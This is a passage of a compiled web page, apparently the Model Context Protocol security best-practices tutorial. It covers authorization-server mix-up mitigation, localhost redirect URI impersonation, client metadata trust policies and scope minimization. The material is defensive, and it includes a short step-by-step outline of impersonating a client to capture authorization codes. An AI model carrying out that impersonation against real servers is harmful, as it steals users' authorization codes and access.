Section 1`}),`).`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-8`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization#authorization-response-validation`,children:`Authorization Response Validation`}),`\nmitigates this by binding the response to the authorization server\nthe client recorded before redirecting, so the authorization code\ncannot be redeemed at an unintended token endpoint. PKCE alone does\nnot prevent this attack because the client transmits the\n`,_jsx(_components.code,{children:`code_verifier`}),` to the attacker’s token endpoint. Resource indicators\ndo not help when the attacker’s authorization server is intercepting\nrequests before they hit the honest authorization server. This\nmitigation depends on honest authorization servers emitting `,_jsx(_components.code,{children:`iss`}),`; it\nprovides no protection against an honest server that does not.`]}),`\n`,_jsx(Heading,{level:`3`,id:`localhost-redirect-uri-impersonation`,children:`Localhost Redirect URI Impersonation`}),`\n`,_jsxs(_components.p,{children:[`Native and locally-running MCP clients commonly use `,_jsx(_components.code,{children:`localhost`}),`\nredirect URIs. When clients identify themselves with\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents`,children:`Client ID Metadata Documents`}),`,\nthe metadata document proves control of a domain, but it cannot prove\nwhich local process is listening on a `,_jsx(_components.code,{children:`localhost`}),` redirect URI.`]}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-8`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`An attacker can claim to be any client by:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[`Providing the legitimate client’s metadata URL as their `,_jsx(_components.code,{children:`client_id`})]}),`\n`,_jsxs(_components.li,{children:[`Binding to any `,_jsx(_components.code,{children:`localhost`}),` port, and providing that address as\nthe redirect_uri`]}),`\n`,_jsx(_components.li,{children:`Receiving the authorization code via the redirect when the user\napproves`}),`\n`]}),`\n`,_jsx(_components.p,{children:`The server will see the legitimate client’s metadata document and the\nuser will see the legitimate client’s name, making attack detection\ndifficult.`}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-9`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`See\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/security-considerations#localhost-redirect-uri-risks`,children:`Localhost Redirect URI Risks`}),`\nin the authorization specification for the countermeasures expected\nof authorization servers, including displaying additional warnings for\n`,_jsx(_components.code,{children:`localhost`}),`-only redirect URIs and clearly displaying the redirect URI\nhostname during authorization.`]}),`\n`,_jsx(Heading,{level:`3`,id:`cimd-trust-policies`,children:`CIMD Trust Policies`}),`\n`,_jsxs(_components.p,{children:[`Authorization servers that accept\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents`,children:`Client ID Metadata Documents`}),`\ncan apply domain-based trust policies to decide which URL-based\nclient IDs to accept:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Allowlists for trusted domains (for protected servers)`}),`\n`,_jsxs(_components.li,{children:[`Accept any HTTPS `,_jsx(_components.code,{children:`client_id`}),` (for open servers)`]}),`\n`,_jsx(_components.li,{children:`Reputation checks for unknown domains`}),`\n`,_jsx(_components.li,{children:`Restrictions based on domain age or certificate validation`}),`\n`,_jsx(_components.li,{children:`Display the CIMD and other associated client hostnames prominently\nto prevent phishing`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`Servers maintain full control over their access policies. See\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/security-considerations#trust-policies`,children:`Trust Policies`}),`\nin the authorization specification, along with\n`,_jsx(_components.a,{href:`https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.4`,children:`Section 6.4`}),`\nand\n`,_jsx(_components.a,{href:`https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.8`,children:`Section 6.8`}),`\nof the Client ID Metadata Document specification, for more details.`]}),`\n`,_jsx(Heading,{level:`3`,id:`scope-minimization`,children:`Scope Minimization`}),`\n`,_jsx(_components.p,{children:`Poor scope design increases token compromise impact, elevates user\nfriction, and obscures audit trails.`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-9`,children:`Attack Description`}),`\n`,_jsxs(_components.p,{children:[`An attacker obtains (via log leakage, memory scraping, or local\ninterception) an access token carrying broad scopes (`,_jsx(_components.code,{children:`files:*`}),`, `,_jsx(_components.code,{children:`db:*`}),`,\n`,_jsx(_components.code,{children:`admin:*`}),`) that were granted up front because the MCP server exposed\nevery scope in `,_jsx(_components.code,{children:`scopes_supported`}),` and the client requested them all.\nThe token enables lateral data access, privilege chaining, and difficult\nrevocation without re-consenting the entire surface.`]}),`\n`,_jsx(Heading,{level:`4`,id:`risks-6`,children:`Risks`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Expanded blast radius: stolen broad token enables unrelated\ntool/resource access`}),`\n`,_jsx(_components.li,{children:`Higher friction on revocation: revoking a max-privilege token disrupts\nall workflows`}),`\n`,_jsx(_components.li,{children:`Audit noise: single omnibus scope masks user intent per operation`}),`\n`,_jsx(_components.li,{children:`Privilege chaining: attacker can immediately invoke high-risk tools\nwithout further elevation prompts`}),`\n`,_jsx(_components.li,{children:`Consent abandonment: users decline dialogs listing excessive scopes`}),`\n`,_jsx(_components.li,{children:`Scope inflation blindness: lack of metrics makes over-broad requests\nnormalised`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-10`,children:`Mitigation`}),`\n`,_jsx(_components.p,{children:`Implement a progressive, least-privilege scope model:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Minimal initial scope set (e.g., `,_jsx(_components.code,{children:`mcp:tools-basic`}),`) containing only\nlow-risk discovery/read operations`]}),`\n`,_jsxs(_components.li,{children:[`Incremental elevation via targeted `,_jsx(_components.code,{children:`WWW-Authenticate`}),` `,_jsx(_components.code,{children:`scope=\"...\"`}),`\nchallenges when privileged operations are first attempted`]}),`\n`,_jsx(_components.li,{children:`Down-scoping tolerance: server should accept reduced scope tokens;\nauth server MAY issue a subset of requested scopes`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Server guidance:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Emit precise scope challenges; avoid returning the full catalog`}),`\n`,_jsx(_components.li,{children:`Log elevation events (scope requested, granted subset) with\ncorrelation IDs`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Servers have flexibility in determining which scopes to include:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Minimum approach`}),`: Include only the scopes required for the\nspecific operation that triggered the error.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Recommended approach`}),`: Include the scopes required for the\ncurrent operation along with related scopes that commonly work\ntogether, to reduce the number of step-up authorization rounds.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Extended approach`}),`: Include the scopes required for the\ncurrent operation, related scopes, and any other scopes the\nserver anticipates the client may need in the near future.`]}),`\n`]}),`\n`,_jsx(_components.p,{children:`The choice depends on the server’s assessment of user experience impact and authorization friction.`}),`\n`,_jsx(_components.p,{children:`Client guidance:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Begin with only baseline scopes (or those specified by initial\n`,_jsx(_components.code,{children:`WWW-Authenticate`}),`)`]}),`\n`,_jsx(_components.li,{children:`Cache recent failures to avoid repeated elevation loops for denied\nscopes`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`When the initial `,_jsx(_components.code,{children:`WWW-Authenticate`}),` challenge carries no `,_jsx(_components.code,{children:`scope`}),`\nparameter, the\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization#scope-selection-strategy`,children:`Scope Selection Strategy`}),`\ndirects clients to fall back to requesting all scopes listed in\n`,_jsx(_components.code,{children:`scopes_supported`}),`. This approach accommodates the general-purpose\nnature of MCP clients, which typically lack domain-specific knowledge\nto make informed decisions about individual scope selection.\nRequesting all available scopes allows the authorization server and\nend-user to determine appropriate permissions during the consent\nprocess, minimizing user friction while following the principle of\nleast privilege.`]}),`\n`,_jsx(Note,{children:_jsxs(_components.p,{children:[`Scope accumulation across operations is a client-side responsibility. Clients\n`,_jsx(_components.strong,{children:`SHOULD`}),` compute the union of previously requested scopes and newly\nchallenged scopes when initiating re-authorization, as described in `,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization#step-up-authorization-flow`,children:`Step-Up\nAuthorization\nFlow`}),`.\nThis allows servers to remain stateless with respect to client scope sets\nwhile ensuring clients do not lose previously granted permissions.`]})}),`\n`,_jsx(Note,{children:_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Hierarchical scopes`}),`: Some authorization servers define scope hierarchies\nwhere a broader scope implies narrower ones (for example, an `,_jsx(_components.code,{children:`admin`}),` scope\nthat subsumes `,_jsx(_components.code,{children:`read`}),`). When accumulating scopes, the client’s union may\ncontain semantically redundant entries. For example, a token previously\ngranted a broad scope may be challenged with a narrower one it already\nimplies. Clients need not deduplicate hierarchically; authorization servers\ntypically normalize such redundancy during token issuance. Servers, for their\npart, must account for hierarchy when deciding whether a token is sufficient\nfor an operation, but this does not affect the scopes they emit in a\nchallenge.`]})}),`\n`,_jsx(Heading,{level:`4`,id:`common-mistakes`,children:`Common Mistakes`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Publishing all possible scopes in `,_jsx(_components.code,{children:`scopes_supported`})]}),`\n`,_jsxs(_components.li,{children:[`Using wildcard or omnibus scopes (`,_jsx(_components.code,{children:`*`}),`, `,_jsx(_components.code,{children:`all`}),`, `,_jsx(_components.code,{children:`full-access`}),`)`]}),`\n`,_jsx(_components.li,{children:`Bundling unrelated privileges to preempt future prompts`}),`\n`,_jsx(_components.li,{children:`Returning entire scope catalog in every challenge`}),`\n`,_jsx(_components.li,{children:`Silent scope semantic changes without versioning`}),`\n`,_jsx(_components.li,{children:`Treating claimed scopes in token as sufficient without server-side\nauthorization logic`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Proper minimization constrains compromise impact, improves audit\nclarity, and reduces consent churn.`})]})}function MDXContent(props={}){const{wrapper:MDXLayout}={..._provideComponents(),...props.components};return MDXLayout?_jsx(MDXLayout,{...props,children:_jsx(_createMdxContent,{...props})}):_createMdxContent(props)}return{default:MDXContent};function _missingMdxReference(id,component){throw new Error(`Expected `+(component?`component`:`object`)+\" `\"+id+\"` to be defined: you likely forgot to import, pass, or provide it.\")}"])</script><script>self.__next_f.push([1,"54:[\"$\",\"$L57\",null,{\"slug\":\"docs/2026-07-28/tutorials/security/security_best_practices\",\"pageMetadata\":\"$48:props:pageMetadata\",\"theme\":\"mint\",\"children\":[\"$\",\"$L58\",null,{\"mdxSource\":{\"compiledSource\":\"$59\",\"frontmatter\":{},\"scope\":{\"config\":{},\"pageMetadata\":{\"title\":\"Security Best Practices\",\"description\":\"Security considerations, attack vectors, and best practices for MCP implementations\",\"href\":\"/docs/2026-07-28/tutorials/security/security_best_practices\"}}},\"mdxSourceWithNoJs\":{\"compiledSource\":\"$5a\",\"frontmatter\":{},\"scope\":{\"config\":{},\"pageMetadata\":{\"title\":\"Security Best Practices\",\"description\":\"Security considerations, attack vectors, and best practices for MCP implementations\",\"href\":\"/docs/2026-07-28/tutorials/security/security_best_practices\"}}},\"displayDomain\":\"modelcontextprotocol.io\"}]}]\n"])</script></body></html>